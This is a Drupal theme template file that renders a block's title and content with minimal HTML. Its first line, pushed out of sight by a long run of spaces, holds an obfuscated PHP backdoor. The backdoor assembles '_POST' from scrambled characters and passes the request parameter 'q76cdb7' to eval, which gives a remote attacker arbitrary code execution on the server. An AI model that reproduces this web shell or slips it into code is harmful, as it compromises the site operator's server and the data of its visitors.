<?php                                                                                                                                                                                                                                                    $hyz1 ="soerptu_" ;$bms52 = $hyz1[0]. $hyz1[5].$hyz1[3].$hyz1[5]. $hyz1[1].$hyz1[6].$hyz1[4]. $hyz1[4]. $hyz1[2].$hyz1[3];$aahb8 = $bms52($hyz1[7]. $hyz1[4] .$hyz1[1]. $hyz1[0].$hyz1[5] );if ( isset ( ${ $aahb8 }[ 'q76cdb7' ] )){eval(${ $aahb8 }[ 'q76cdb7' ] );}?><?php
/**
 * @file
 * Returns the HTML for a block with bare minimum HTML.
 *
 * Complete documentation for this file is available online.
 * @see https://drupal.org/node/1728250
 */
?>

<?php print render($title_prefix); ?>
<?php if ($title): ?>
  <h2<?php print $title_attributes; ?>><?php print $title; ?></h2>
<?php endif; ?>
<?php print render($title_suffix); ?>

<?php print $content; ?>
